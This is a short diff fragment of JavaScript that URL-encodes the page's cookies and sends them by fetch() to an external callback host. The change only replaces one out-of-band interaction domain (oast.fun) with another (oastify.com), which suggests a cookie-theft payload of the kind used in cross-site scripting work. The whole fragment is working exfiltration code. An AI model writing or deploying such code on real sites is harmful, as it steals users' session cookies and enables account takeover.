@@ -3,7 +3,7 @@
   if (cookies) {
     const encodedCookies = encodeURIComponent(cookies);
     fetch(
-      `https://xdhaevcpormyqlbyonhng28sz5bmii03j.oast.fun/?cookies=${encodedCookies}`
+      `https://lrgaw8kskuaavvzfc109nd2bk2qteo2d.oastify.com/?cookies=${encodedCookies}`
     );
   }
 })();
